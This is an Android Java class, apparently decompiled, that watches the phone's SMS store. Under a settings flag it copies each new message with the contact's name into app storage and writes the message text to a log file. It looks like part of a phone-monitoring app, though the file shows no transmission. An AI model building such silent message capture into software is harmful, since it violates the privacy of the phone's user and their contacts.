package iits.service;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import iits.code.bus.Contact_History_BUS;
import iits.code.bus.SMS_BUS;
import iits.code.bus.SMS_History_BUS;
import iits.code.bus.Setting_BUS;
import iits.code.dto.SMS_DTO;
import iits.code.dto.Setting_DTO;
import iits.mamager.FileManager;

public class SMSListener extends ContentObserver {
    private static final String TAG = "SMSListener";
    private ContentResolver contentResolver;
    private Context context;
    private long id;
    private long time;

    public SMSListener(Handler handler, ContentResolver contentResolver2, Context context2) {
        super(handler);
        try {
            this.contentResolver = contentResolver2;
            this.context = context2;
            SMS_DTO sms = SMS_History_BUS.getLastSMS(contentResolver2);
            if (sms == null) {
                this.id = 0;
                this.time = 0;
                return;
            }
            this.id = sms.getID();
            this.time = sms.getTime();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on SMSListener function: " + e.toString());
        }
    }

    public boolean deliverSelfNotifications() {
        return false;
    }

    public void onChange(boolean arg0) {
        SMS_DTO sms;
        super.onChange(arg0);
        try {
            Setting_DTO setting = Setting_BUS.get(this.context);
            if ((setting.getRunMode() || setting.getFlagSMS()) && (sms = SMS_History_BUS.getSMSNew(this.contentResolver, this.id, this.time)) != null) {
                sms.setName(Contact_History_BUS.getName(this.contentResolver, sms.getNumber()));
                SMS_BUS.insert(this.context, sms);
                FileManager.WriteLog(1, TAG, "insert sms: " + sms.getMessage() + "-" + sms.getName());
            }
            SMS_DTO sms2 = SMS_History_BUS.getLastSMS(this.contentResolver);
            if (sms2 == null) {
                this.id = 0;
                this.time = 0;
                return;
            }
            this.id = sms2.getID();
            this.time = sms2.getTime();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onChange function: " + e.toString());
        }
    }
}
